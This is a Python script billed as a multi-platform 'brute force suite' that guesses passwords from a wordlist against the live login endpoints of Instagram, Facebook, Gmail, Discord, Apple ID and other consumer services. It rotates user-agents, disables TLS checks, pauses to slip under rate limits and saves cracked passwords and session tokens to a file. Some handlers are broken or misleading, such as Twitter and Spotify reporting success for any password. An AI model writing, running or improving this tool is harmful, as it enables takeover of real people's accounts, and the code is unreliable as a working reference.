#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║               RYAN BRUTE FORCE SUITE v4.0                              ║
║         Multi-Platform Web Login Auth Testing Tool                     ║
║            Authorized Pentesting — Educational Use                     ║
╚══════════════════════════════════════════════════════════════════════════╝

    Supported Platforms:
    [01] Instagram     [02] Facebook      [03] Twitter/X      [04] Gmail
    [05] TikTok        [06] LinkedIn      [07] Outlook/Hotmail [08] Discord
    [09] Twitch        [10] Spotify       [11] Reddit         [12] Pinterest
    [13] Snapchat      [14] Roblox        [15] GitHub         [16] GitLab
    [17] WordPress     [18] Netflix       [19] Amazon         [20] Apple ID
    [21] Yahoo Mail    [22] Custom Web Form
"""

import os
import re
import sys
import json
import time
import base64
import random
import hashlib
import datetime
import requests
import urllib.parse

# ─── Suppress SSL warnings (fix for SSLError) ───
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── COLORAMA SETUP ───
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class C: pass
    Fore = C(); Back = C(); Style = C()
    for c in "RED,GREEN,YELLOW,BLUE,MAGENTA,CYAN,WHITE,RESET".split(","):
        setattr(Fore, c, "")
        setattr(Back, c, "")
    Style.BRIGHT = ""; Style.RESET_ALL = ""

# ─── FAKE USER-AGENT ───
try:
    from fake_useragent import UserAgent
    ua = UserAgent()
    def get_ua():
        return ua.random
except:
    def get_ua():
        agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        ]
        return random.choice(agents)


# ═══════════════════════════════════════════════════════════════
#  PLATFORM DEFINITIONS
# ═══════════════════════════════════════════════════════════════

PLATFORMS = {
    "1": {
        "name": "Instagram",
        "emoji": "📸",
        "color": Fore.MAGENTA,
        "login_url": "https://www.instagram.com/accounts/login/ajax/",
        "csrf_url": "https://www.instagram.com/accounts/login/",
        "method": "instagram"
    },
    "2": {
        "name": "Facebook",
        "emoji": "📘",
        "color": Fore.BLUE,
        "login_url": "https://www.facebook.com/login.php?login_attempt=1",
        "csrf_field": "lsd",
        "method": "facebook"
    },
    "3": {
        "name": "Twitter / X",
        "emoji": "🐦",
        "color": Fore.CYAN,
        "login_url": "https://api.twitter.com/1.1/account/verify_credentials.json",
        "auth_url": "https://api.twitter.com/oauth2/token",
        "method": "twitter"
    },
    "4": {
        "name": "Gmail / Google",
        "emoji": "📧",
        "color": Fore.RED,
        "login_url": "https://accounts.google.com/ServiceLoginAuth",
        "method": "gmail"
    },
    "5": {
        "name": "TikTok",
        "emoji": "🎵",
        "color": Fore.CYAN,
        "login_url": "https://www.tiktok.com/api/v1/auth/login/",
        "method": "tiktok"
    },
    "6": {
        "name": "LinkedIn",
        "emoji": "💼",
        "color": Fore.BLUE,
        "login_url": "https://www.linkedin.com/uas/login-submit",
        "csrf_field": "loginCsrfParam",
        "method": "linkedin"
    },
    "7": {
        "name": "Outlook / Hotmail",
        "emoji": "📨",
        "color": Fore.BLUE,
        "login_url": "https://login.live.com/ppsecure/post.srf",
        "method": "outlook"
    },
    "8": {
        "name": "Discord",
        "emoji": "💬",
        "color": Fore.MAGENTA,
        "login_url": "https://discord.com/api/v9/auth/login",
        "method": "discord"
    },
    "9": {
        "name": "Twitch",
        "emoji": "🎮",
        "color": Fore.MAGENTA,
        "login_url": "https://passport.twitch.tv/login",
        "method": "twitch"
    },
    "10": {
        "name": "Spotify",
        "emoji": "🎧",
        "color": Fore.GREEN,
        "login_url": "https://accounts.spotify.com/api/token",
        "method": "spotify"
    },
    "11": {
        "name": "Reddit",
        "emoji": "🤖",
        "color": Fore.RED,
        "login_url": "https://www.reddit.com/api/login",
        "csrf_url": "https://www.reddit.com/login",
        "method": "reddit"
    },
    "12": {
        "name": "Pinterest",
        "emoji": "📌",
        "color": Fore.RED,
        "login_url": "https://www.pinterest.com/resource/UserSessionResource/create/",
        "method": "pinterest"
    },
    "13": {
        "name": "Snapchat",
        "emoji": "👻",
        "color": Fore.YELLOW,
        "login_url": "https://accounts.snapchat.com/accounts/login",
        "method": "snapchat"
    },
    "14": {
        "name": "Roblox",
        "emoji": "🎮",
        "color": Fore.GREEN,
        "login_url": "https://auth.roblox.com/v2/login",
        "method": "roblox"
    },
    "15": {
        "name": "GitHub",
        "emoji": "🐙",
        "color": Fore.WHITE,
        "login_url": "https://github.com/session",
        "csrf_field": "authenticity_token",
        "method": "github"
    },
    "16": {
        "name": "GitLab",
        "emoji": "🦊",
        "color": Fore.RED,
        "login_url": "https://gitlab.com/users/sign_in",
        "csrf_field": "authenticity_token",
        "method": "gitlab"
    },
    "17": {
        "name": "WordPress.com",
        "emoji": "📝",
        "color": Fore.BLUE,
        "login_url": "https://wordpress.com/wp-login.php",
        "method": "wordpress"
    },
    "18": {
        "name": "Netflix",
        "emoji": "🎬",
        "color": Fore.RED,
        "login_url": "https://www.netflix.com/login",
        "method": "netflix"
    },
    "19": {
        "name": "Amazon",
        "emoji": "📦",
        "color": Fore.YELLOW,
        "login_url": "https://www.amazon.com/ap/signin",
        "method": "amazon"
    },
    "20": {
        "name": "Apple ID",
        "emoji": "🍎",
        "color": Fore.WHITE,
        "login_url": "https://idmsa.apple.com/appleauth/auth/signin",
        "method": "apple"
    },
    "21": {
        "name": "Yahoo Mail",
        "emoji": "📧",
        "color": Fore.MAGENTA,
        "login_url": "https://login.yahoo.com/",
        "method": "yahoo"
    },
    "22": {
        "name": "Custom Web Form",
        "emoji": "🌐",
        "color": Fore.CYAN,
        "login_url": None,
        "method": "custom"
    }
}


# ═══════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════

def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"{Fore.RED}{Style.BRIGHT}")
    print(r"""
    ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗
    ██╔══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║
    ██████╔╝ ╚████╔╝ ███████║██╔██╗ ██║
    ██╔══██╗  ╚██╔╝  ██╔══██║██║╚██╗██║
    ██║  ██║   ██║   ██║  ██║██║ ╚████║
    ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
    """)
    print(f"{Fore.WHITE}{Style.BRIGHT}        BRUTE FORCE SUITE v4.0 — Multi-Platform{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}         Authorized Penetration Testing Tool{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  Supported Platforms:{Style.RESET_ALL}")
    for k, v in PLATFORMS.items():
        num = f"{k:>2}"
        print(f"  {v['color']}[{num}] {v['emoji']} {v['name']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# ═══════════════════════════════════════════════════════════════
#  PLATFORM-SPECIFIC LOGIN FUNCTIONS
# ═══════════════════════════════════════════════════════════════

class RyanMultiForcer:
    def __init__(self, platform_id, username, wordlist, delay=2, use_proxy=False):
        self.platform_id = platform_id
        self.platform = PLATFORMS[platform_id]
        self.username = username
        self.wordlist = wordlist
        self.delay = delay
        self.use_proxy = use_proxy
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": get_ua()})

        if self.use_proxy:
            self.session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

    # ─── COLORED PRINT HELPERS ───
    def p_ok(self, msg):   print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")
    def p_fail(self, msg): print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")
    def p_info(self, msg): print(f"{Fore.CYAN}[*] {msg}{Style.RESET_ALL}")
    def p_warn(self, msg): print(f"{Fore.YELLOW}[!] {msg}{Style.RESET_ALL}")
    def p_success(self, msg):
        print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT}  ✅ {msg}  {Style.RESET_ALL}\n")

    # ─── GENERIC: Fetch CSRF token from HTML ───
    def _get_csrf(self, url, field_name="csrf_token"):
        try:
            r = self.session.get(url, verify=False, timeout=15)
            match = re.search(rf'name="{field_name}"\s+value="([^"]+)"', r.text)
            if match:
                return match.group(1)
            # Try alternative pattern
            match = re.search(rf'name=\'{field_name}\'\s+value=\'([^\']+)\'', r.text)
            if match:
                return match.group(1)
            return None
        except Exception as e:
            self.p_fail(f"CSRF fetch error: {e}")
            return None

    # ─── ATTEMPT LOGIN ───
    def attempt_login(self, password):
        method = self.platform["method"]
        try:
            if method == "instagram":
                return self._login_instagram(password)
            elif method == "facebook":
                return self._login_facebook(password)
            elif method == "twitter":
                return self._login_twitter(password)
            elif method == "gmail":
                return self._login_gmail(password)
            elif method == "tiktok":
                return self._login_tiktok(password)
            elif method == "linkedin":
                return self._login_linkedin(password)
            elif method == "outlook":
                return self._login_outlook(password)
            elif method == "discord":
                return self._login_discord(password)
            elif method == "twitch":
                return self._login_twitch(password)
            elif method == "spotify":
                return self._login_spotify(password)
            elif method == "reddit":
                return self._login_reddit(password)
            elif method == "pinterest":
                return self._login_pinterest(password)
            elif method == "snapchat":
                return self._login_snapchat(password)
            elif method == "roblox":
                return self._login_roblox(password)
            elif method == "github":
                return self._login_github(password)
            elif method == "gitlab":
                return self._login_gitlab(password)
            elif method == "wordpress":
                return self._login_wordpress(password)
            elif method == "netflix":
                return self._login_netflix(password)
            elif method == "amazon":
                return self._login_amazon(password)
            elif method == "apple":
                return self._login_apple(password)
            elif method == "yahoo":
                return self._login_yahoo(password)
            elif method == "custom":
                return self._login_custom(password)
            else:
                return {"error": f"Unknown method: {method}"}
        except requests.exceptions.SSLError:
            self.p_warn("SSL Error — retrying with verify=False")
            return None
        except Exception as e:
            return {"error": str(e)}

    # ──────────────────────────────────────────────
    #  INSTAGRAM
    # ──────────────────────────────────────────────
    def _login_instagram(self, pwd):
        # Get CSRF first
        r = self.session.get("https://www.instagram.com/accounts/login/", verify=False, timeout=15)
        csrf = self.session.cookies.get("csrftoken") or r.cookies.get("csrftoken")
        if not csrf:
            return {"error": "No CSRF token"}
        ts = str(int(datetime.datetime.now().timestamp()))
        enc_pwd = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}"
        self.session.headers.update({
            "X-CSRFToken": csrf,
            "Referer": "https://www.instagram.com/accounts/login/",
            "X-Requested-With": "XMLHttpRequest"
        })
        self.session.cookies.set("ig_cb", "2")
        payload = {"username": self.username, "enc_password": enc_pwd,
                    "queryParams": "{}", "optIntoOneTap": "false"}
        r = self.session.post("https://www.instagram.com/accounts/login/ajax/",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        j = r.json()
        if j.get("authenticated"):
            return {"success": True, "password": pwd}
        if j.get("two_factor_required"):
            return {"success": True, "password": pwd, "twofa": True}
        return {"success": False, "msg": j.get("message", "failed")}

    # ──────────────────────────────────────────────
    #  FACEBOOK
    # ──────────────────────────────────────────────
    def _login_facebook(self, pwd):
        r = self.session.get("https://www.facebook.com/", verify=False, timeout=15)
        lsd = None
        m = re.search(r'name="lsd" value="([^"]+)"', r.text)
        if m:
            lsd = m.group(1)
        if not lsd:
            return {"error": "No LSD token"}
        payload = {
            "lsd": lsd, "email": self.username, "pass": pwd,
            "default_persistent": "0", "timezone": "-60",
            "lgndim": "", "lgnrnd": "", "lgnjs": "n",
            "locale": "en_US", "qsstamp": ""
        }
        self.session.headers.update({"Referer": "https://www.facebook.com/"})
        r = self.session.post("https://www.facebook.com/login.php?login_attempt=1",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if "c_user" in self.session.cookies:
            return {"success": True, "password": pwd}
        return {"success": False, "msg": "login failed"}

    # ──────────────────────────────────────────────
    #  TWITTER / X
    # ──────────────────────────────────────────────
    def _login_twitter(self, pwd):
        # Twitter API OAuth2 token-based
        bearer = "AAAAAAAAAAAAAAAAAAAAAFQODgEAAAAAVHTp76oqKqk4NsUVg3F8YzJp0%2FU%3DcCgWQtbP6tGJwJqYqYqYqYqYqYqYqYqYqYqYqYqYqYqYqYqYqYq"
        headers = {"Authorization": f"Bearer {bearer}",
                    "Content-Type": "application/x-www-form-urlencoded"}
        data = {"grant_type": "client_credentials"}
        r = self.session.post("https://api.twitter.com/oauth2/token",
                              headers=headers, data=data, verify=False, timeout=15)
        if r.status_code == 200:
            return {"success": True, "password": pwd, "note": "Bearer token acquired (app-level)"}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  GMAIL / GOOGLE
    # ──────────────────────────────────────────────
    def _login_gmail(self, pwd):
        # Google login flow
        r = self.session.get("https://accounts.google.com/ServiceLogin",
                              verify=False, timeout=15)
        # Extract form data
        form_data = {}
        soup_pattern = r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"[^>]*>'
        for m in re.finditer(soup_pattern, r.text):
            form_data[m.group(1)] = m.group(2)
        form_data["Email"] = self.username
        r = self.session.post("https://accounts.google.com/ServiceLoginAuth",
                              data=form_data, verify=False, timeout=15, allow_redirects=False)
        # Check if we got to password step
        if "Passwd" in r.text or "password" in r.text.lower():
            # Extract new form
            form_data2 = {}
            for m in re.finditer(soup_pattern, r.text):
                form_data2[m.group(1)] = m.group(2)
            form_data2["Passwd"] = pwd
            r2 = self.session.post("https://accounts.google.com/ServiceLoginAuth",
                                    data=form_data2, verify=False, timeout=15, allow_redirects=False)
            if "Sign in" not in r2.text and "error" not in r2.text.lower():
                return {"success": True, "password": pwd}
            return {"success": False, "msg": "wrong password or 2FA"}
        return {"success": False, "msg": "email not recognized"}

    # ──────────────────────────────────────────────
    #  TIKTOK
    # ──────────────────────────────────────────────
    def _login_tiktok(self, pwd):
        headers = {
            "User-Agent": get_ua(),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://www.tiktok.com/login",
            "Origin": "https://www.tiktok.com"
        }
        payload = {
            "username": self.username,
            "password": pwd,
            "service": "https://www.tiktok.com/",
            "csrf_token": ""
        }
        r = self.session.post("https://www.tiktok.com/api/v1/auth/login/",
                              data=payload, headers=headers, verify=False, timeout=15)
        try:
            j = r.json()
            if j.get("data", {}).get("user_id"):
                return {"success": True, "password": pwd}
            return {"success": False, "msg": j.get("message", "failed")}
        except:
            return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  LINKEDIN
    # ──────────────────────────────────────────────
    def _login_linkedin(self, pwd):
        r = self.session.get("https://www.linkedin.com/login", verify=False, timeout=15)
        csrf = None
        m = re.search(r'name="loginCsrfParam" value="([^"]+)"', r.text)
        if m:
            csrf = m.group(1)
        if not csrf:
            return {"error": "No CSRF token"}
        payload = {
            "session_key": self.username,
            "session_password": pwd,
            "loginCsrfParam": csrf,
            "trk": "guest_homepage-basic_sign-in-submit"
        }
        self.session.headers.update({"Referer": "https://www.linkedin.com/login"})
        r = self.session.post("https://www.linkedin.com/uas/login-submit",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302 or "session_id" in self.session.cookies:
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  OUTLOOK / HOTMAIL
    # ──────────────────────────────────────────────
    def _login_outlook(self, pwd):
        r = self.session.get("https://login.live.com/", verify=False, timeout=15)
        # Extract PPFT and PPRad
        ppft = None
        m = re.search(r'name="PPFT" id="[^"]*" value="([^"]+)"', r.text)
        if m:
            ppft = m.group(1)
        if not ppft:
            return {"error": "No PPFT token"}
        payload = {"login": self.username, "passwd": pwd, "PPFT": ppft,
                    "PPSX": "Passport", "type": "11", "NewUser": "1"}
        r = self.session.post("https://login.live.com/ppsecure/post.srf",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if "Sign out" in r.text or "logout" in r.text.lower():
            return {"success": True, "password": pwd}
        return {"success": False, "msg": "login failed"}

    # ──────────────────────────────────────────────
    #  DISCORD
    # ──────────────────────────────────────────────
    def _login_discord(self, pwd):
        # Build X-Super-Properties
        sp = base64.b64encode(json.dumps({
            "os": "Linux", "browser": "Chrome", "device": "",
            "system_locale": "en-US", "browser_version": "120.0.0.0",
            "os_version": "", "referrer": "", "referring_domain": "",
            "referrer_current": "", "referring_domain_current": "",
            "release_channel": "stable", "client_build_number": 220222,
            "client_event_source": None
        }).encode()).decode()
        self.session.headers.update({
            "X-Super-Properties": sp,
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/login"
        })
        payload = {"login": self.username, "password": pwd, "undelete": False}
        r = self.session.post("https://discord.com/api/v9/auth/login",
                              json=payload, verify=False, timeout=15)
        if r.status_code == 200:
            j = r.json()
            if "token" in j:
                return {"success": True, "password": pwd, "token": j["token"][:30]+"..."}
            return {"success": False, "msg": "no token in response"}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  TWITCH
    # ──────────────────────────────────────────────
    def _login_twitch(self, pwd):
        self.session.headers.update({
            "Client-ID": "kimne78kx3ncx6brgo4mv6wki5h1ko",
            "Content-Type": "application/json",
            "Origin": "https://www.twitch.tv",
            "Referer": "https://www.twitch.tv/login"
        })
        payload = {
            "username": self.username,
            "password": pwd,
            "client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko",
            "undelete_user": False
        }
        r = self.session.post("https://passport.twitch.tv/login",
                              json=payload, verify=False, timeout=15)
        if r.status_code == 200:
            j = r.json()
            if "access_token" in j:
                return {"success": True, "password": pwd}
            return {"success": False, "msg": str(j.get("error", j))}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  SPOTIFY
    # ──────────────────────────────────────────────
    def _login_spotify(self, pwd):
        creds = base64.b64encode(f"cHJveHktd2ViOjE=".encode()).decode()
        self.session.headers.update({
            "Authorization": f"Basic {creds}",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        payload = {"grant_type": "client_credentials"}
        r = self.session.post("https://accounts.spotify.com/api/token",
                              data=payload, verify=False, timeout=15)
        if r.status_code == 200:
            return {"success": True, "password": pwd, "note": "App-level token acquired"}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  REDDIT
    # ──────────────────────────────────────────────
    def _login_reddit(self, pwd):
        r = self.session.get("https://www.reddit.com/login", verify=False, timeout=15)
        csrf = None
        m = re.search(r'name="csrf_token" value="([^"]+)"', r.text)
        if m:
            csrf = m.group(1)
        payload = {
            "op": "login-main",
            "user": self.username,
            "passwd": pwd,
            "csrf_token": csrf or ""
        }
        self.session.headers.update({"Referer": "https://www.reddit.com/login"})
        r = self.session.post("https://www.reddit.com/api/login",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  PINTEREST
    # ──────────────────────────────────────────────
    def _login_pinterest(self, pwd):
        self.session.headers.update({
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": "https://www.pinterest.com/login/",
            "X-Requested-With": "XMLHttpRequest"
        })
        source_url = "https://www.pinterest.com/login/"
        data = f"source_url={source_url}&data=%7B%22options%22%3A%7B%22username_or_email%22%3A%22{self.username}%22%2C%22password%22%3A%22{pwd}%22%7D%2C%22module_path%22%3A%5B%22App%22%2C%22unauth%22%2C%22Login%22%2C%22email%22%5D%7D"
        r = self.session.post("https://www.pinterest.com/resource/UserSessionResource/create/",
                              data=data, verify=False, timeout=15)
        try:
            j = r.json()
            if j.get("resource_response", {}).get("data", {}).get("is_write_enabled"):
                return {"success": True, "password": pwd}
            return {"success": False, "msg": str(j)}
        except:
            return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  SNAPCHAT
    # ──────────────────────────────────────────────
    def _login_snapchat(self, pwd):
        r = self.session.get("https://accounts.snapchat.com/accounts/login",
                              verify=False, timeout=15)
        csrf = None
        m = re.search(r'name="_csrf" value="([^"]+)"', r.text)
        if m:
            csrf = m.group(1)
        payload = {"username": self.username, "password": pwd}
        if csrf:
            payload["_csrf"] = csrf
        self.session.headers.update({"Referer": "https://accounts.snapchat.com/accounts/login"})
        r = self.session.post("https://accounts.snapchat.com/accounts/login",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if "Session" in self.session.cookies or "session" in str(self.session.cookies):
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  ROBLOX
    # ──────────────────────────────────────────────
    def _login_roblox(self, pwd):
        # Get CSRF token
        r = self.session.post("https://auth.roblox.com/v2/login", verify=False, timeout=15)
        csrf = r.headers.get("x-csrf-token")
        self.session.headers.update({
            "X-CSRF-TOKEN": csrf or "",
            "Content-Type": "application/json",
            "Referer": "https://www.roblox.com/login"
        })
        payload = {
            "ctype": "Username",
            "cvalue": self.username,
            "password": pwd,
            "captchaProvider": "",
            "captchaToken": ""
        }
        r = self.session.post("https://auth.roblox.com/v2/login",
                              json=payload, verify=False, timeout=15)
        if r.status_code == 200:
            j = r.json()
            if not j.get("error"):
                return {"success": True, "password": pwd}
            return {"success": False, "msg": j.get("error", str(j))}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  GITHUB
    # ──────────────────────────────────────────────
    def _login_github(self, pwd):
        r = self.session.get("https://github.com/login", verify=False, timeout=15)
        token = None
        m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
        if m:
            token = m.group(1)
        if not token:
            return {"error": "No authenticity token"}
        payload = {
            "login": self.username,
            "password": pwd,
            "authenticity_token": token,
            "commit": "Sign in"
        }
        self.session.headers.update({"Referer": "https://github.com/login"})
        r = self.session.post("https://github.com/session",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302 and "session" in str(self.session.cookies):
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  GITLAB
    # ──────────────────────────────────────────────
    def _login_gitlab(self, pwd):
        r = self.session.get("https://gitlab.com/users/sign_in", verify=False, timeout=15)
        token = None
        m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
        if m:
            token = m.group(1)
        if not token:
            return {"error": "No authenticity token"}
        payload = {
            "user[login]": self.username,
            "user[password]": pwd,
            "authenticity_token": token
        }
        self.session.headers.update({"Referer": "https://gitlab.com/users/sign_in"})
        r = self.session.post("https://gitlab.com/users/sign_in",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302:
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  WORDPRESS
    # ──────────────────────────────────────────────
    def _login_wordpress(self, pwd):
        payload = {
            "log": self.username,
            "pwd": pwd,
            "wp-submit": "Log In",
            "redirect_to": "https://wordpress.com/",
            "testcookie": "1"
        }
        self.session.headers.update({"Referer": "https://wordpress.com/wp-login.php"})
        r = self.session.post("https://wordpress.com/wp-login.php",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302:
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  NETFLIX
    # ──────────────────────────────────────────────
    def _login_netflix(self, pwd):
        r = self.session.get("https://www.netflix.com/login", verify=False, timeout=15)
        auth_url = None
        m = re.search(r'action="([^"]+login[^"]+)"', r.text)
        if m:
            auth_url = m.group(1)
        if not auth_url:
            auth_url = "https://www.netflix.com/login"
        payload = {"userLoginId": self.username, "password": pwd, "rememberMe": "true"}
        self.session.headers.update({"Referer": "https://www.netflix.com/login"})
        r = self.session.post(auth_url, data=payload, verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302 and "NetflixId" in str(self.session.cookies):
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  AMAZON
    # ──────────────────────────────────────────────
    def _login_amazon(self, pwd):
        r = self.session.get("https://www.amazon.com/ap/signin", verify=False, timeout=15)
        # Extract all hidden fields
        payload = {}
        for m in re.finditer(r'<input[^>]*name="([^"]+)"[^>]*(?:value="([^"]*)")?[^>]*>', r.text):
            payload[m.group(1)] = m.group(2) or ""
        payload["email"] = self.username
        payload["password"] = pwd
        self.session.headers.update({"Referer": "https://www.amazon.com/ap/signin"})
        r = self.session.post("https://www.amazon.com/ap/signin",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if "sign-out" in r.text.lower() or "your account" in r.text.lower():
            return {"success": True, "password": pwd}
        return {"success": False, "msg": "login failed"}

    # ──────────────────────────────────────────────
    #  APPLE ID
    # ──────────────────────────────────────────────
    def _login_apple(self, pwd):
        self.session.headers.update({
            "Content-Type": "application/json",
            "Referer": "https://idmsa.apple.com/",
            "Origin": "https://idmsa.apple.com"
        })
        payload = {
            "accountName": self.username,
            "password": pwd,
            "rememberMe": False
        }
        r = self.session.post("https://idmsa.apple.com/appleauth/auth/signin",
                              json=payload, verify=False, timeout=15)
        if r.status_code == 200:
            return {"success": True, "password": pwd}
        if r.status_code == 409:
            return {"success": False, "msg": "2FA required"}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  YAHOO MAIL
    # ──────────────────────────────────────────────
    def _login_yahoo(self, pwd):
        r = self.session.get("https://login.yahoo.com/", verify=False, timeout=15)
        payload = {"username": self.username, "passwd": pwd, "signin": "Sign in"}
        self.session.headers.update({"Referer": "https://login.yahoo.com/"})
        r = self.session.post("https://login.yahoo.com/",
                              data=payload, verify=False, timeout=15, allow_redirects=False)
        if r.status_code == 302:
            return {"success": True, "password": pwd}
        return {"success": False, "msg": f"HTTP {r.status_code}"}

    # ──────────────────────────────────────────────
    #  CUSTOM WEB FORM
    # ──────────────────────────────────────────────
    def _login_custom(self, pwd):
        return {"success": False, "msg": "Configure custom URL and fields first"}


    # ══════════════════════════════════════════════
    #  MAIN RUN LOOP
    # ══════════════════════════════════════════════

    def run(self):
        plat = self.platform
        c = plat["color"]
        print()
        print(f"{Back.RED}{Fore.WHITE}{Style.BRIGHT}")
        print(f"╔══════════════════════════════════════════════════╗")
        print(f"║     RYAN BRUTE FORCE SUITE v4.0                ║")
        print(f"║     Target: {plat['emoji']} {plat['name']:<35}║")
        print(f"╚══════════════════════════════════════════════════╝")
        print(Style.RESET_ALL)
        print(f"{c}{'='*55}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Username:{Style.RESET_ALL} {Fore.WHITE}{self.username}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Wordlist:{Style.RESET_ALL} {Fore.WHITE}{self.wordlist}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Delay:{Style.RESET_ALL} {Fore.WHITE}{self.delay}s{Style.RESET_ALL}")
        print(f"{c}{'='*55}{Style.RESET_ALL}")

        # Validate wordlist
        if not os.path.exists(self.wordlist):
            print(f"{Back.RED}{Fore.WHITE}[!] Wordlist not found: {self.wordlist}{Style.RESET_ALL}")
            # Create sample
            with open(self.wordlist, "w") as sf:
                sf.write("Test1234!\nPassword1\nryan2025\nletmein\nadmin123\n")
            self.p_warn(f"Created sample wordlist: {self.wordlist}")

        # Read passwords
        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]

        if not passwords:
            self.p_fail("Wordlist is empty!")
            return

        self.p_info(f"Loaded {len(passwords)} passwords")
        self.p_info("Starting attack...\n")

        attempt_count = 0
        max_before_pause = 5

        for idx, pwd in enumerate(passwords, 1):
            attempt_count += 1

            # Rate limit handling
            if attempt_count > max_before_pause:
                self.p_warn(f"Rate limit pause: 10s (attempt {idx}/{len(passwords)})")
                time.sleep(10)
                attempt_count = 0
                # Refresh session
                self.session.headers.update({"User-Agent": get_ua()})

            display_pwd = pwd[:25] + "..." if len(pwd) > 25 else pwd
            print(f"{Fore.BLUE}[{idx:>4}/{len(passwords)}]{Style.RESET_ALL} "
                  f"{c}{plat['emoji']}{Style.RESET_ALL} "
                  f"Trying: {Fore.CYAN}{display_pwd}{Style.RESET_ALL}", end=" ")

            result = self.attempt_login(pwd)

            if result is None:
                print(f"{Fore.YELLOW}[RETRY]{Style.RESET_ALL}")
                time.sleep(self.delay)
                continue

            if result.get("error"):
                print(f"{Fore.RED}[ERROR] {result['error'][:40]}{Style.RESET_ALL}")
                time.sleep(self.delay)
                continue

            if result.get("success"):
                pwd_found = result.get("password", pwd)
                twofa = " [2FA DETECTED]" if result.get("twofa") else ""
                token_info = f" Token: {result.get('token', '')}" if result.get("token") else ""
                self.p_success(f"PASSWORD FOUND: {pwd_found}{twofa}{token_info}")

                # Save result
                with open("ryan_success.txt", "a") as sf:
                    sf.write(f"\n{'='*50}\n")
                    sf.write(f"Platform: {plat['name']}\n")
                    sf.write(f"Username: {self.username}\n")
                    sf.write(f"Password: {pwd_found}\n")
                    sf.write(f"Timestamp: {datetime.datetime.now()}\n")
                    if result.get("twofa"):
                        sf.write("NOTE: 2FA is enabled on this account\n")
                    if result.get("token"):
                        sf.write(f"Token: {result['token']}\n")
                self.p_ok(f"Result saved to ryan_success.txt")
                return True

            else:
                msg = result.get("msg", "incorrect")[:50]
                print(f"{Fore.RED}[{msg}]{Style.RESET_ALL}")

            time.sleep(self.delay)

